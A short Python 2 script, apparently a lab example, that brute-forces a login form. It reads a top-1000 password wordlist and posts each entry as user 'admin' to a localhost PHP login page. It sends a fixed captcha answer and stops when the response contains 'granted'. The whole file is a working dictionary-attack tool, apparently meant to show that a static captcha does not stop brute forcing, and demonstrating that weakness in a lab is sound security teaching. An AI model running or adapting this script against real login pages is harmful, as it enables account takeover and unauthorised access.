#exampleBruteforce.py
import requests
import sys

wordlist_path = "10_million_password_list_top_1000.txt"
url = 'http://localhost:8080/goodcaptchalogin.php'
url2 = 'http://localhost:8080/badcaptchalogin.php'
wordlist = None

def makeRequest(word):
	r = requests.post(url, data = {'username': 'admin', 'password':word, 'captcha-field':'DOG CAT'})
	return r

def getNextPassword():
	return wordlist.readline().rstrip()

def restartLine():
    sys.stdout.write('\r')
    sys.stdout.flush()


if __name__=="__main__":
	count = 0
	wordlist = open(wordlist_path, "r")
	sys.stdout.write('Tried ' + str(count) + ' words so far...')
	sys.stdout.flush()
	while True:
		restartLine()
		sys.stdout.write('Tried ' + str(count) + ' words so far...')
		sys.stdout.flush()
		word = getNextPassword()
		if not word:
			print
			print "Password not found :( Perhaps try a bigger list?"
			break
		r = makeRequest(word)
		count += 1
		if "granted" in r.text.lower():
			print
			print "Password is: " + word
			break
